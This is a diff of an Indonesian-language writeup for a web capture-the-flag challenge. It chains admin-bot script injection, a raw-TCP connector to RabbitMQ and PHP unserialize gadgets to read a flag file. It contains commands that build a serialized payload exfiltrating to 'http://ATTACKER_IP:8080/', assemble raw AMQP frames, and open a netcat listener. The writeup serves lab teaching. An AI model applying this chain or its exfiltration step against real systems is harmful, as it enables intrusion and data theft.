@@ -1,10 +1,19 @@
-# theme-review-portal — Writeup
+# theme-review-portal — Web CTF
 
-Challenge web: portal review theme (Bun + Hono, webpack, worker PHP + RabbitMQ). Bot admin me-review theme yang di-submit. Flag ada di `/flag.txt` **di container worker PHP**.
+Portal review theme (Bun + Hono, webpack, worker PHP + RabbitMQ). Bot admin me-review theme yang di-submit. Flag ada di `/flag.txt` **di container worker PHP**.
+
+## Menjalankan
+
+```bash
+docker compose up --build
+# buka http://127.0.0.1:3105
+```
+
+Flag default: `PLAYIT{fake}` (lihat `worker-php/Dockerfile`).
 
 ## Komponen
 
-- `gateway/app` (Bun/Hono, port host `3105`): user submit theme (`asset_js`, `query`, `callback_url`), bot admin membuka `/admin/reviews/<id>` dengan CSP nonce + `'strict-dynamic'`.
+- `gateway/app` (Bun/Hono): user submit theme (`asset_js`, `query`, `callback_url`), bot admin membuka `/admin/reviews/<id>` dengan CSP nonce + `'strict-dynamic'`.
 - `connector-test` (`POST /api/reviews/:id/connector-test`): butuh admin + CSRF, dan **mengirim byte mentah apa pun** (dari `segments_b64`) via TCP ke host/port pilihan (default `rabbitmq:5672`).
 - `worker` (PHP): consume queue `preview.render`, `unserialize($message->body)` dengan `allowed_classes => true`, lalu `__destruct` gadget di `worker-php/classes.php` membaca file dan meng-exfil.
 
@@ -27,7 +36,7 @@ Private/protected property harus memakai nama termangling, jadi generate dari
 `classes.php` asli via reflection:
 
 ```bash
-php gen_payload.php http://ATTACKER_IP:8080/
+CLASSES=./worker-php/classes.php php solutions/theme-review-portal/gen_payload.php http://ATTACKER_IP:8080/
 # -> base64(serialize(PreviewBatch))
 ```
 
@@ -43,7 +52,7 @@ Objek penting:
 ### b. Frame AMQP mentah
 
 ```bash
-python3 build_amqp.py <payload_b64> > frames.json
+python3 solutions/theme-review-portal/build_amqp.py <payload_b64> > frames.json
 ```
 
 Menghasilkan handshake AMQP 0-9-1 (header, Start-Ok, Tune-Ok, Open, Channel.Open)
@@ -52,13 +61,13 @@ Menghasilkan handshake AMQP 0-9-1 (header, Start-Ok, Tune-Ok, Open, Channel.Open
 
 ### c. Script admin (asset_js)
 
-Isi `asset_js` dengan `payload.js` (tempel `frames.json` ke `segments_b64`).
-Script mengambil CSRF dan mengirim `connector-test`; worker lalu mengeksekusi gadget.
+Isi `asset_js` dengan `solutions/theme-review-portal/payload.js` (tempel `frames.json`
+ke `segments_b64`). Script mengambil CSRF dan mengirim `connector-test`; worker lalu
+mengeksekusi gadget.
 
-## Menjalankan
+## Langkah manual
 
 ```bash
-cd theme-review-portal
 docker compose up --build
 # 1) jalankan listener: nc -lvnp 8080
 # 2) buat akun, buat theme (asset_js = payload.js yang sudah diisi frames),
@@ -72,6 +81,5 @@ docker compose up --build
   Saat menjalankan, pastikan request chunk `preview-runtime` benar-benar mengarah
   ke `/uploads/<id>/assets/chunks/preview-runtime.js` (lihat DevTools/`tcpdump`);
   itu titik yang membuat `asset_js` milik attacker tereksekusi.
-- Payload generator (`gen_payload.php`, `build_amqp.py`) adalah bagian yang
-  paling deterministik; uji dulu gadget tanpa bot dengan `docker compose exec`
-  ke worker jika perlu.
+- Payload generator (`gen_payload.php`, `build_amqp.py`) adalah bagian yang paling
+  deterministik dan sudah dicek output-nya; rantai penuh belum diuji end-to-end.
